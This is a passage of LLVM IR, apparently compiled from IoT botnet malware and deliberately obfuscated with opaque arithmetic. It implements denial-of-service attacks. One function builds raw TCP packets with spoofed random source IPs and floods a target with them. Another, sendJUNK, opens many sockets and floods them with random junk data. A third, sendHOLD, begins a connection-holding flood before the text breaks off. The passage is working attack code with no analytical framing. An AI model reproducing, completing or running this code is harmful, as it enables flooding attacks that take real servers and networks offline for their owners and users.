  %284 = load i16, i16* %283, align 4
  %285 = xor i16 %284, -1
  %286 = xor i16 -513, -1
  %287 = xor i16 -4508, -1
  %288 = or i16 %285, %286
  %289 = or i16 -4508, %287
  %290 = xor i16 %288, -1
  %291 = and i16 %290, %289
  %292 = and i16 %284, -513
  %293 = xor i16 %291, -1
  %294 = xor i16 512, -1
  %295 = xor i16 15047, -1
  %296 = and i16 %293, 15047
  %297 = and i16 %291, %295
  %298 = and i16 %294, 15047
  %299 = and i16 512, %295
  %300 = or i16 %296, %297
  %301 = or i16 %298, %299
  %302 = xor i16 %300, %301
  %303 = or i16 %293, %294
  %304 = xor i16 %303, -1
  %305 = or i16 15047, %295
  %306 = and i16 %304, %305
  %307 = or i16 %302, %306
  %308 = or i16 %291, 512
  store i16 %307, i16* %283, align 4
  br label %430

; <label>:309:                                    ; preds = %275
  %310 = load i8*, i8** %23, align 8
  %311 = call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0)) #10
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %327, label %313

; <label>:313:                                    ; preds = %309
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = xor i16 -1025, -1
  %320 = xor i16 %318, %319
  %321 = and i16 %320, %318
  %322 = and i16 %318, -1025
  %323 = and i16 %321, 1024
  %324 = xor i16 %321, 1024
  %325 = or i16 %323, %324
  %326 = or i16 %321, 1024
  store i16 %325, i16* %317, align 4
  br label %429

; <label>:327:                                    ; preds = %309
  %328 = load i8*, i8** %23, align 8
  %329 = call i32 @strcmp(i8* %328, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0)) #10
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %361, label %331

; <label>:331:                                    ; preds = %327
  %332 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon.0* %333 to %struct.anon.1*
  %335 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %334, i32 0, i32 4
  %336 = load i16, i16* %335, align 4
  %337 = xor i16 %336, -1
  %338 = xor i16 -257, -1
  %339 = xor i16 -28342, -1
  %340 = or i16 %337, %338
  %341 = or i16 -28342, %339
  %342 = xor i16 %340, -1
  %343 = and i16 %342, %341
  %344 = and i16 %336, -257
  %345 = xor i16 %343, -1
  %346 = xor i16 256, -1
  %347 = xor i16 984, -1
  %348 = and i16 %345, 984
  %349 = and i16 %343, %347
  %350 = and i16 %346, 984
  %351 = and i16 256, %347
  %352 = or i16 %348, %349
  %353 = or i16 %350, %351
  %354 = xor i16 %352, %353
  %355 = or i16 %345, %346
  %356 = xor i16 %355, -1
  %357 = or i16 984, %347
  %358 = and i16 %356, %357
  %359 = or i16 %354, %358
  %360 = or i16 %343, 256
  store i16 %359, i16* %335, align 4
  br label %428

; <label>:361:                                    ; preds = %327
  %362 = load i8*, i8** %23, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i32 0, i32 0)) #10
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %391, label %365

; <label>:365:                                    ; preds = %361
  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon.0* %367 to %struct.anon.1*
  %369 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = xor i16 -4097, -1
  %372 = xor i16 %370, %371
  %373 = and i16 %372, %370
  %374 = and i16 %370, -4097
  %375 = xor i16 %373, -1
  %376 = xor i16 4096, -1
  %377 = xor i16 8238, -1
  %378 = and i16 %375, 8238
  %379 = and i16 %373, %377
  %380 = and i16 %376, 8238
  %381 = and i16 4096, %377
  %382 = or i16 %378, %379
  %383 = or i16 %380, %381
  %384 = xor i16 %382, %383
  %385 = or i16 %375, %376
  %386 = xor i16 %385, -1
  %387 = or i16 8238, %377
  %388 = and i16 %386, %387
  %389 = or i16 %384, %388
  %390 = or i16 %373, 4096
  store i16 %389, i16* %369, align 4
  br label %427

; <label>:391:                                    ; preds = %361
  %392 = load i8*, i8** %23, align 8
  %393 = call i32 @strcmp(i8* %392, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %425, label %395

; <label>:395:                                    ; preds = %391
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon.0* %397 to %struct.anon.1*
  %399 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %398, i32 0, i32 4
  %400 = load i16, i16* %399, align 4
  %401 = xor i16 %400, -1
  %402 = xor i16 -2049, -1
  %403 = xor i16 5813, -1
  %404 = or i16 %401, %402
  %405 = or i16 5813, %403
  %406 = xor i16 %404, -1
  %407 = and i16 %406, %405
  %408 = and i16 %400, -2049
  %409 = xor i16 %407, -1
  %410 = xor i16 2048, -1
  %411 = xor i16 32424, -1
  %412 = and i16 %409, 32424
  %413 = and i16 %407, %411
  %414 = and i16 %410, 32424
  %415 = and i16 2048, %411
  %416 = or i16 %412, %413
  %417 = or i16 %414, %415
  %418 = xor i16 %416, %417
  %419 = or i16 %409, %410
  %420 = xor i16 %419, -1
  %421 = or i16 32424, %411
  %422 = and i16 %420, %421
  %423 = or i16 %418, %422
  %424 = or i16 %407, 2048
  store i16 %423, i16* %399, align 4
  br label %426

; <label>:425:                                    ; preds = %391
  br label %426

; <label>:426:                                    ; preds = %425, %395
  br label %427

; <label>:427:                                    ; preds = %426, %365
  br label %428

; <label>:428:                                    ; preds = %427, %331
  br label %429

; <label>:429:                                    ; preds = %428, %313
  br label %430

; <label>:430:                                    ; preds = %429, %279
  %431 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %431, i8** %23, align 8
  br label %272

; <label>:432:                                    ; preds = %272
  br label %433

; <label>:433:                                    ; preds = %432, %147
  %434 = call i32 @rand_cmwc()
  %435 = trunc i32 %434 to i16
  %436 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 0
  %438 = bitcast %union.anon.0* %437 to %struct.anon.1*
  %439 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %438, i32 0, i32 5
  store i16 %435, i16* %439, align 2
  %440 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 0
  %442 = bitcast %union.anon.0* %441 to %struct.anon.1*
  %443 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %442, i32 0, i32 6
  store i16 0, i16* %443, align 4
  %444 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 0
  %446 = bitcast %union.anon.0* %445 to %struct.anon.1*
  %447 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %446, i32 0, i32 7
  store i16 0, i16* %447, align 2
  %448 = load i32, i32* %9, align 4
  %449 = icmp eq i32 %448, 0
  br i1 %449, label %450, label %452

; <label>:450:                                    ; preds = %433
  %451 = call i32 @rand_cmwc()
  br label %457

; <label>:452:                                    ; preds = %433
  %453 = load i32, i32* %9, align 4
  %454 = trunc i32 %453 to i16
  %455 = call zeroext i16 @htons(i16 zeroext %454) #13
  %456 = zext i16 %455 to i32
  br label %457

; <label>:457:                                    ; preds = %452, %450
  %458 = phi i32 [ %451, %450 ], [ %456, %452 ]
  %459 = trunc i32 %458 to i16
  %460 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 0
  %462 = bitcast %union.anon.0* %461 to %struct.anon.1*
  %463 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %462, i32 0, i32 1
  store i16 %459, i16* %463, align 2
  %464 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %465 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %466 = call zeroext i16 @tcpcsum(%struct.iphdr* %464, %struct.tcphdr* %465)
  %467 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  %469 = bitcast %union.anon.0* %468 to %struct.anon.1*
  %470 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %469, i32 0, i32 6
  store i16 %466, i16* %470, align 4
  %471 = bitcast i8* %93 to i16*
  %472 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 2
  %474 = load i16, i16* %473, align 2
  %475 = zext i16 %474 to i32
  %476 = call zeroext i16 @csum(i16* %471, i32 %475)
  %477 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 7
  store i16 %476, i16* %478, align 2
  %479 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %480 = load i32, i32* %10, align 4
  %481 = sub i32 0, %479
  %482 = sub i32 0, %480
  %483 = add i32 %481, %482
  %484 = sub i32 0, %483
  %485 = add nsw i32 %479, %480
  store i32 %484, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %486

; <label>:486:                                    ; preds = %539, %538, %457
  br label %487

; <label>:487:                                    ; preds = %486
  %488 = load i32, i32* %17, align 4
  %489 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %490 = call i64 @sendto(i32 %488, i8* %93, i64 %90, i32 0, %struct.sockaddr* %489, i32 16)
  %491 = load i32, i32* %19, align 4
  %492 = call i32 @getRandomIP(i32 %491)
  %493 = call i32 @htonl(i32 %492) #13
  %494 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 8
  store i32 %493, i32* %495, align 4
  %496 = call i32 @rand_cmwc()
  %497 = trunc i32 %496 to i16
  %498 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 3
  store i16 %497, i16* %499, align 4
  %500 = call i32 @rand_cmwc()
  %501 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i32 0, i32 0
  %503 = bitcast %union.anon.0* %502 to %struct.anon.1*
  %504 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %503, i32 0, i32 2
  store i32 %500, i32* %504, align 4
  %505 = call i32 @rand_cmwc()
  %506 = trunc i32 %505 to i16
  %507 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 0
  %509 = bitcast %union.anon.0* %508 to %struct.anon.1*
  %510 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %509, i32 0, i32 0
  store i16 %506, i16* %510, align 4
  %511 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %512 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %511, i32 0, i32 0
  %513 = bitcast %union.anon.0* %512 to %struct.anon.1*
  %514 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %513, i32 0, i32 6
  store i16 0, i16* %514, align 4
  %515 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %516 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %517 = call zeroext i16 @tcpcsum(%struct.iphdr* %515, %struct.tcphdr* %516)
  %518 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 0
  %520 = bitcast %union.anon.0* %519 to %struct.anon.1*
  %521 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %520, i32 0, i32 6
  store i16 %517, i16* %521, align 4
  %522 = bitcast i8* %93 to i16*
  %523 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 2
  %525 = load i16, i16* %524, align 2
  %526 = zext i16 %525 to i32
  %527 = call zeroext i16 @csum(i16* %522, i32 %526)
  %528 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 7
  store i16 %527, i16* %529, align 2
  %530 = load i32, i32* %25, align 4
  %531 = load i32, i32* %15, align 4
  %532 = icmp eq i32 %530, %531
  br i1 %532, label %533, label %539

; <label>:533:                                    ; preds = %487
  %534 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %535 = load i32, i32* %24, align 4
  %536 = icmp sgt i32 %534, %535
  br i1 %536, label %537, label %538

; <label>:537:                                    ; preds = %533
  br label %545

; <label>:538:                                    ; preds = %533
  store i32 0, i32* %25, align 4
  br label %486

; <label>:539:                                    ; preds = %487
  %540 = load i32, i32* %25, align 4
  %541 = add i32 %540, 1421090080
  %542 = add i32 %541, 1
  %543 = sub i32 %542, 1421090080
  %544 = add i32 %540, 1
  store i32 %543, i32* %25, align 4
  br label %486

; <label>:545:                                    ; preds = %537
  %546 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %546)
  br label %547

; <label>:547:                                    ; preds = %545, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %253

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = sub i32 0, %45
  %48 = sub i32 0, %46
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add nsw i32 %45, %46
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %250, %32
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %251

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %244, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %250

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %243 [
    i32 0, label %68
    i32 1, label %115
    i32 2, label %217
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = and i32 %84, 2048
  %86 = xor i32 %84, 2048
  %87 = or i32 %85, %86
  %88 = or i32 %84, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %87)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  br i1 %97, label %102, label %98

; <label>:98:                                     ; preds = %68
  %99 = call i32* @__errno_location() #13
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 115
  br i1 %101, label %102, label %109

; <label>:102:                                    ; preds = %98, %68
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = call i32 @close(i32 %107)
  br label %114

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %8, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %111
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %112, i32 0, i32 1
  store i8 1, i8* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %109, %102
  br label %243

; <label>:115:                                    ; preds = %61
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %118 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 0
  %119 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %118) #2, !srcloc !6
  %120 = extractvalue { i64, i64* } %119, 0
  %121 = extractvalue { i64, i64* } %119, 1
  %122 = trunc i64 %120 to i32
  store i32 %122, i32* %18, align 4
  %123 = ptrtoint i64* %121 to i64
  %124 = trunc i64 %123 to i32
  store i32 %124, i32* %19, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = xor i64 %144, -1
  %146 = xor i64 %134, -1
  %147 = xor i64 1725055661252178003, -1
  %148 = and i64 %145, 1725055661252178003
  %149 = and i64 %144, %147
  %150 = and i64 %146, 1725055661252178003
  %151 = and i64 %134, %147
  %152 = or i64 %148, %149
  %153 = or i64 %150, %151
  %154 = xor i64 %152, %153
  %155 = or i64 %145, %146
  %156 = xor i64 %155, -1
  %157 = or i64 1725055661252178003, %147
  %158 = and i64 %156, %157
  %159 = or i64 %154, %158
  %160 = or i64 %144, %134
  store i64 %159, i64* %143, align 8
  %161 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %161, align 8
  %162 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %162, align 8
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = sub i32 0, 1
  %169 = sub i32 %167, %168
  %170 = add nsw i32 %167, 1
  %171 = call i32 @select(i32 %169, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %171, i32* %15, align 4
  %172 = load i32, i32* %15, align 4
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %201

; <label>:174:                                    ; preds = %126
  store i32 4, i32* %13, align 4
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = bitcast i32* %14 to i8*
  %181 = call i32 @getsockopt(i32 %179, i32 1, i32 4, i8* %180, i32* %13) #2
  %182 = load i32, i32* %14, align 4
  %183 = icmp ne i32 %182, 0
  br i1 %183, label %184, label %195

; <label>:184:                                    ; preds = %174
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 8
  %190 = call i32 @close(i32 %189)
  %191 = load i32, i32* %8, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %192
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %193, i32 0, i32 1
  store i8 0, i8* %194, align 4
  br label %200

; <label>:195:                                    ; preds = %174
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 2, i8* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %195, %184
  br label %216

; <label>:201:                                    ; preds = %126
  %202 = load i32, i32* %15, align 4
  %203 = icmp eq i32 %202, -1
  br i1 %203, label %204, label %215

; <label>:204:                                    ; preds = %201
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 8
  %210 = call i32 @close(i32 %209)
  %211 = load i32, i32* %8, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %212
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %213, i32 0, i32 1
  store i8 0, i8* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %204, %201
  br label %216

; <label>:216:                                    ; preds = %215, %200
  br label %243

; <label>:217:                                    ; preds = %61
  %218 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %218, i32 1024)
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = load i8*, i8** %16, align 8
  %225 = call i64 @send(i32 %223, i8* %224, i64 1024, i32 16384)
  %226 = icmp eq i64 %225, -1
  br i1 %226, label %227, label %242

; <label>:227:                                    ; preds = %217
  %228 = call i32* @__errno_location() #13
  %229 = load i32, i32* %228, align 4
  %230 = icmp ne i32 %229, 11
  br i1 %230, label %231, label %242

; <label>:231:                                    ; preds = %227
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 1
  store i8 0, i8* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %231, %227, %217
  br label %243

; <label>:243:                                    ; preds = %242, %216, %114, %61
  br label %244

; <label>:244:                                    ; preds = %243
  %245 = load i32, i32* %8, align 4
  %246 = add i32 %245, 29855606
  %247 = add i32 %246, 1
  %248 = sub i32 %247, 29855606
  %249 = add nsw i32 %245, 1
  store i32 %248, i32* %8, align 4
  br label %57

; <label>:250:                                    ; preds = %57
  br label %52

; <label>:251:                                    ; preds = %52
  %252 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %252)
  br label %253

; <label>:253:                                    ; preds = %251, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
